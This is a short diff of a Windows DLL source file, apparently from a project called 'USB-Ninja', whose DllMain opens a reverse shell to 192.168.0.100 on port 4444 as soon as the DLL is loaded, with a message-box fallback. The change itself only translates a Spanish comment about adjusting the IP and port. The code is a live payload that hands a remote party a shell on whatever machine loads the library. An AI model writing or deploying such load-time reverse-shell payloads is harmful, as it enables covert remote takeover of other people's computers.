@@ -34,7 +34,7 @@ static BOOL CreateReverseShell(const char* ip, unsigned short port) {
 BOOL WINAPI DllMain(HINSTANCE, DWORD reason, LPVOID) {
     if (reason == DLL_PROCESS_ATTACH) {
 #ifdef REVERSE_SHELL
-        (void)CreateReverseShell("192.168.0.100", 4444); // ajustá IP/puerto
+        (void)CreateReverseShell("192.168.0.100", 4444); // adjust ip-port
 #else
         MessageBoxA(nullptr, "Ninja payload ejecutado",
                     "USB-Ninja", MB_OK | MB_ICONINFORMATION);
